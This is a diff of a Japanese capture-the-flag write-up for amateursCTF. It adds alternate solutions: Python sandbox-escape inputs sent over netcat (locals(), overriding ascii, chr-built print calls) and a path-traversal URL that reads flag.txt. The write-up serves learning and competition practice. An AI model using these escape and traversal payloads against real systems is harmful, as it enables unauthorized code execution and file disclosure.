@@ -88,6 +88,8 @@ False
 時間かかるとサーバから切断されるので、2分探索をしています。  
 開催中は面倒だったので線形探索で時間かけてやりました。
 
+- solver.py
+
 ```py:solver.py
 #!/usr/local/bin/python
 from pwn import *
@@ -164,6 +166,28 @@ flag: amateursCTF{i_l0v3_overwr1t1nG_functions..:D}
 
 フラグを見る限り、非想定解のようです。
 
+### 別解:misc/Censorship
+
+他の人のWriteupを見る限り、いろいろ解き方があるみたいです。
+
+- locals関数で、ローカル変数の中身を出力する。
+
+```sh
+$ nc amt.rs 31670
+Give code: locals()[_]
+'amateursCTF{i_l0v3_overwr1t1nG_functions..:D}'
+```
+
+- 関数の上書き
+  - ascii関数を上書きして、chrで書いた文字列を実行させる。
+
+```sh
+$ nc amt.rs 31670
+Give code: ascii = lambda x: x;
+Give code: (lambda:chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(95)+chr(41))()
+amateursCTF{i_l0v3_overwr1t1nG_functions..:D}
+```
+
 ## misc/Censorship Lite
 
 ![3](./images/3.jpg)
@@ -204,6 +228,8 @@ a=ord('b')-ord('a');b=ord('k')-ord('a');c=b*b;d=a-a;ord(_[d])==b+b+b+b+b+b+b+b+b
 
 後は、Censorshipのスクリプトにmake_n関数を追加して数値と置き換えることで解けました。  
 文字列を短くするために、よく使いそうな数値をBASEにまとめています。
+
+- solver.py
 
 ```py:solver.py
 #!/usr/local/bin/python
@@ -339,6 +365,8 @@ NameError: name 'zz' is not defined
 
 以下コード。
 
+- solver.py
+
 ```py:solver.py
 #!/usr/local/bin/python
 from pwn import *
@@ -465,6 +493,10 @@ $ curl https://funny-factorials.amt.rs/?theme=..................................
   <body>
 <SNIP>
 ```
+
+### 別解:web/funny factorials
+
+他の人のWriteupを見る限り、`https://funny-factorials.amt.rs/?theme=//flag.txt`で良かったようです。
 
 ## web/latek
 
